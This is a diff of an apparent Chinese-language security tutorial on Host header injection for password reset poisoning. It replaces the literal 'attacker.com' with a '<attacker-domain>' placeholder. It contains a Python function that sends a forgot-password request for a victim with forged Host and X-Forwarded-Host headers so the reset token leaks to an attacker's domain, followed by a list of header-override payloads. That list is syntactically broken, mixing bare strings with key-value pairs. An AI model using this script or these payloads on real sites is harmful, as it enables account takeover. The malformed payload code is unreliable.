@@ -18,8 +18,8 @@ Host 头被后端用于:
 # 后端生成重置链接: https://{Host}/reset?token=xxx
 
 # 攻击: 修改 Host 头
-# Host: attacker.com
-# → 受害者收到的邮件链接: https://attacker.com/reset?token=xxx
+# Host: <attacker-domain>
+# → 受害者收到的邮件链接: https://<attacker-domain>/reset?token=xxx
 # → 攻击者拿到 token
 
 import requests
@@ -29,8 +29,8 @@ def hijack_password_reset(target: str):
     r = requests.post(f"{target}/forgot", data={
         "email": "victim@victim.com"
     }, headers={
-        "Host": "attacker.com",
-        "X-Forwarded-Host": "attacker.com",  # 如果后端用这个
+        "Host": "<attacker-domain>",
+        "X-Forwarded-Host": "<attacker-domain>",  # 如果后端用这个
     })
     return r.status_code
 ```
@@ -40,22 +40,22 @@ def hijack_password_reset(target: str):
 ```python
 HOST_PAYLOADS = [
     # 基础
-    "attacker.com",
+    "<attacker-domain>",
     # 端口欺骗
     "target.com:1337",
     # 带凭证
-    "target.com@attacker.com",
+    "target.com@<attacker-domain>",
     # 子域名欺骗
-    "attacker.com#target.com",
-    "attacker.com%23target.com",
+    "<attacker-domain>#target.com",
+    "<attacker-domain>%23target.com",
     # X-Forwarded-Host (如果后端取这个优先)
-    "attacker.com",
+    "<attacker-domain>",
     # Host override headers
-    "X-Forwarded-Host": "attacker.com",
-    "X-Host": "attacker.com",
-    "X-Forwarded-Server": "attacker.com",
-    "X-HTTP-Host-Override": "attacker.com",
-    "Forwarded": "host=attacker.com",
+    "X-Forwarded-Host": "<attacker-domain>",
+    "X-Host": "<attacker-domain>",
+    "X-Forwarded-Server": "<attacker-domain>",
+    "X-HTTP-Host-Override": "<attacker-domain>",
+    "Forwarded": "host=<attacker-domain>",
 ]
 ```
 
